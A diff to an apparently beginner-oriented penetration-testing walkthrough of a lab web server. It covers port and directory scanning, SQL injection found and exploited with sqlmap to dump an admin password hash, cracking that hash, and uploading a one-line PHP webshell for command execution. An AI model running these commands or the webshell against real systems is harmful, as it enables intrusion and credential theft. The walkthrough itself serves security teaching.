@@ -17,7 +17,7 @@ There are various tools for conduct port scanning, but the most commonly used cu
 sudo apt install nmap
 ```
 
-#### Basic scan
+#### Basic usage
 ```
 nmap 103.31.33.37
 ```
@@ -39,16 +39,179 @@ We find two HTTP Ports open in port 80 and 8080
 
 
 ### Information Gathering
+HTTP and HTTPS Protocol sometime contain some information in their response header and we can gather some information from it. here we will using `curl` tools.
 
+#### Install curl
+```
+sudo apt install nmap curl
+```
+
+#### Basic usage
+we will use `-I` flags so it only print the headers response 
+```
+curl -I 103.31.33.37
+```
+
+#### Port 80 Result
+```
+❯ curl -I http://103.31.33.37/
+HTTP/1.1 200 OK
+Date: Thu, 07 Mar 2024 14:38:43 GMT
+Server: Apache/2.4.52 (Debian)
+X-Powered-By: PHP/7.3.33
+Content-Type: text/html; charset=UTF-8
+```
+
+#### Port 8080 Result
+```
+❯ curl -I http://103.31.33.37:8080/
+HTTP/1.1 200 OK
+Date: Thu, 07 Mar 2024 14:39:31 GMT
+Server: Apache/2.4.52 (Debian)
+Last-Modified: Tue, 27 Feb 2024 14:40:33 GMT
+ETag: "804-6125e02396e80"
+Accept-Ranges: bytes
+Content-Length: 2052
+Vary: Accept-Encoding
+Content-Type: text/html
+```
 
 ### Directory Scanning
+Since we found some HTTP port, we can gather more information in it about is any path is exists in these web or not by directory scanning and there are various tools for conduct directory scanning, here we will use `dirsearch` because it's easy to use as beginner. Make sure you have installed python to run this tools because this tools written in python.
+
+#### Install Python3 and Pip3
+```
+sudo apt install python3 python3-pip -y
+```
+
+#### Clonse Dirsearch Repository
+```
+git clone https://github.com/maurosoria/dirsearch
+```
+
+#### Install python package requirements
+```
+cd dirsearch
+pip3 install -r requirements.txt
+```
+
+#### Basic usage
+```
+❯ python3 dirsearch.py -u http://103.31.33.37/
+```
+
+#### Port 80 Result
+```
+❯ python3 dirsearch.py -u http://103.31.33.37/
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722
+
+Output: /home/fedra/dirsearch/reports/http_103.31.33.37/__24-03-07_21-12-21.txt
+
+Target: http://103.31.33.37/
+
+[21:12:21] Starting:
+[21:14:19] 301 -  314B  - /img  ->  http://103.31.33.37/img/
+[21:14:19] 301 -  314B  - /inc  ->  http://103.31.33.37/inc/
+
+Task Completed
+```
+
+#### Port 8080 Result
+```
+❯ python3 dirsearch.py -u http://103.31.33.37/
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722
+
+Output: /home/fedra/dirsearch/reports/http_103.31.33.37_8080/__24-03-07_21-20-24.txt
+
+Target: http://103.31.33.37:8080/
+
+[21:20:24] Starting:
+[21:21:26] 301 -  331B  - /administrator  ->  http://103.31.33.37:8080/administrator/
+[21:21:26] 200 -    2KB - /administrator/
+[21:21:26] 200 -    2KB - /administrator/index.php
+
+Task Completed
+```
+
+We found some path directory exists in there, this information will useful later if we found some related data
 
 # Vulnerability Analysis
+After checking in two open port, we didn't find anything interesting in port 8080. But when we see web on port 80 having url `detail.php?id=1` when we click on `View Details` menu. When we add single quote `'` in the url, so the url will be like `detail.php?id=1'` the web will giving response like:
+```
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
+```
+In this case, the web potential vulnerable to `SQL Injection` 
 
 # Exploitation
-### 
+### SQL Injection
+We can exploit previous SQL Injection vulnerability using `sqlmap`, the most popular tools for exploiting SQL Injection. You need install python first to run this tools because this tools written in python.
+
+#### Clone sqlmap Repository
+```
+git clone https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+```
+
+#### Basic usage
+```
+❯ python3 sqlmap.py -u <Vulnerable URL with Parameter>
+```
+
+#### Exploiting SQL Injection using sqlmap
+We will using `--dbs` flag so it will list all of the database name
+```
+python3 sqlmap.py -u 'http://192.168.56.102/detail.php?id=1' --dbs
+```
+
+and we will get result
+```
+[22:19:30] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.52, PHP 7.3.33
+back-end DBMS: MySQL >= 5.6
+[22:19:30] [INFO] fetching database names
+available databases [6]:
+[*] administrator
+[*] bookstore
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+```
+
+As we see, the most interesting database to seek is `administrator` and we will dump this database using command below
+```
+python3 sqlmap.py -u 'http://192.168.56.102/detail.php?id=1' -D administrator --dump
+```
+And will getting this result
+```
+Database: administrator
+Table: users
+[1 entry]
++----+----------------------------------+----------+
+| id | password                         | username |
++----+----------------------------------+----------+
+| 1  | b9f385c68320e27d5a4ea0618eef4a94 | admin    |
++----+----------------------------------+----------+
+```
+
 ### Cracking Password
-### Gaining Access
+We got credentials of the admin from the website, but the password seems to be hashed. we will crack the hash by using this website https://hashes.com/en/decrypt/hash and we found the real strings from the hash is `P@assw0rd!`. But where we will use this credentials? remember we see `/administrator` folder exists in port `8080`, right? And we successfully logged in there.
+
+### Gaining Access to Server
+After login we only see the file upload feature in it, since the website using `PHP` as it's backend we can try uploading `.php` file which containing malicious code in it. create new txt file, edit and write `<?php system($_GET["command"]); ?>` in there and rename it extension with `.php` and save it.
+Other reference Malicious Code:
+- https://github.com/bayufedra/Tiny-PHP-Webshell
+
+After submit it, web will giving response `Book inserted successfully!`
 
 # Post-Exploitation
 ### Reverse Shell
